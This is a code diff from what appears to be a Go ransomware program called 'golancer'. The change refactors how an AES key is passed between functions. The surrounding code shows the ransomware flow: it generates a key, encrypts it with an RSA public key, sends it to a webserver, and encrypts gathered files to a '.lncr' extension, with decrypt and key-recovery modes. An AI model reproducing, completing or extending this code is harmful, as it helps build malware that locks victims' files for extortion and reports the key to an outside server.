@@ -45,14 +45,14 @@ func main() {
 		publicKey = cryptutil.LoadRSAPublicKey("public.pem")
 
 		fmt.Println("Generating AES key.")
-		aesKey = cryptutil.GenerateAES()
+		cryptutil.GenerateAES(&aesKey)
 
 		fmt.Println("Encrypting AES key and sending to webserver.")
-		err := webhelper.SendKey(cryptutil.EncryptAESKey(aesKey, publicKey), addr)
+		err := webhelper.SendKey(cryptutil.EncryptAESKey(&aesKey, publicKey), addr)
 		if err != nil {
 			log.Println(err)
 			fmt.Println("Error sending key to webserver. Saving key to disk.")
-			cryptutil.SaveAESKey(cryptutil.EncryptAESKey(aesKey, publicKey), "golancer-e.key")
+			cryptutil.SaveAESKey(cryptutil.EncryptAESKey(&aesKey, publicKey), "golancer-e.key")
 		}
 
 		fmt.Println("Gathering file list.")
@@ -67,7 +67,7 @@ func main() {
 
 	if *dFlag {
 		fmt.Println("Loading AES key.")
-		aesKey = cryptutil.LoadAESKey("golancer.key")
+		cryptutil.LoadAESKey(&aesKey, "golancer.key")
 
 		fmt.Println("Loading file list.")
 		fileList = sysinfo.LoadFileList("files.txt")
@@ -78,7 +78,7 @@ func main() {
 
 	if *aFlag {
 		fmt.Println("Loading encrypted AES key.")
-		aesKey = cryptutil.LoadAESKey("golancer-e.key")
+		cryptutil.LoadAESKey(&aesKey, "golancer-e.key")
 
 		fmt.Println("Loading RSA private key.")
 		privateKey = cryptutil.LoadRSAPrivateKey("private.pem")
@@ -176,7 +176,7 @@ func encryptFiles(files []string) {
 	defer wg.Done()
 	for _, file := range files {
 		fmt.Println(file)
-		cryptutil.EncryptFile(file, ".lncr", aesKey)
+		cryptutil.EncryptFile(file, ".lncr", &aesKey)
 	}
 }
 
@@ -184,7 +184,7 @@ func decryptFiles(files []string) {
 	defer wg.Done()
 	for _, file := range files {
 		fmt.Println(file)
-		cryptutil.DecryptFile(file, ".lncr", aesKey)
+		cryptutil.DecryptFile(file, ".lncr", &aesKey)
 		os.Remove(file + ".lncr")
 	}
 }
